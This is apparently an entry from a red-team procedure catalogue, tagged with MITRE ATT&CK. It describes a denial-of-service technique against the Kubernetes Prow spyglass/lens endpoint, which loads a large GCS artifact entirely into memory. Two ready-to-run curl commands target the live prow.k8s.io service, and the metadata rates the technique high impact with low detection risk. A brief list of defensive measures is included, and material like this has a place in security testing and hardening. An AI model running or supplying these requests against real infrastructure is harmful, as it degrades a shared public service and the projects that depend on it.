---
tags:
  - dos
  - resource-exhaustion
  - gcs
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.243Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: b8167406-2e98-4005-bbc6-de1d6b2798ed
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Trigger-Slow-Response-on-Spyglass-Endpoint

## Summary

This procedure triggers a slow HTTP response on the Kubernetes Prow spyglass/lens endpoint by requesting a large GCS artifact, revealing potential resource consumption vulnerabilities.

## Description

The spyglass/lens endpoint in Prow allows specification of GCS artifacts via the 'artifacts' parameter in the request body. By pointing to a large object like k8s-test-cache.tar.gz, the backend fetches and loads it entirely into memory using ioutil.ReadAll(), causing delays. This step observes the slow response to indicate the issue, setting the stage for DoS exploitation in a public-facing Kubernetes environment.

## Requirements

1. Network access to https://prow.k8s.io/spyglass/lens
2. Knowledge of GCS bucket paths (e.g., kubernetes-jenkins/cache/poc/)
3. Tool for sending HTTP POST requests (e.g., curl)

## Defense

Defensive measures and detection strategies:

- Implement request timeouts and size limits on artifact fetches
- Monitor endpoint response times and memory usage for anomalies
- Rate-limit concurrent requests to the spyglass endpoint

## Objectives

1. Observe delayed responses indicating full memory loads
2. Confirm endpoint accessibility and parameter control
3. Validate large object download behavior

## Instructions

### Step 1: Craft and Send Request

**Context**: Prepare a JSON request body specifying a large artifact and send it to the endpoint to trigger the download.

**Command** (using curl for HTTP POST):
```bash
curl -X POST 'https://prow.k8s.io/spyglass/lens/buildlog/rerender?req={"artifacts":["k8s-test-cache.tar.gz"],"index":0,"src":"gcs/kubernetes-jenkins/cache/poc/"}'
```

> This command sends a POST request with the JSON payload, causing the server to fetch and process the large tar.gz file from GCS, resulting in a slow response as the entire object is read into memory.

### Step 2: Monitor Response

**Context**: Time the response to quantify the slowness and check for large data transfer.

**Command** (add timing with curl):
```bash
curl -w "%{time_total}s total time\n" -X POST 'https://prow.k8s.io/spyglass/lens/buildlog/rerender?req={"artifacts":["k8s-test-cache.tar.gz"],"index":0,"src":"gcs/kubernetes-jenkins/cache/poc/"}'
```

> Expected output includes a total time greater than 10 seconds, indicating resource strain from the uncontrolled download.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- dos
- gcs
- prow
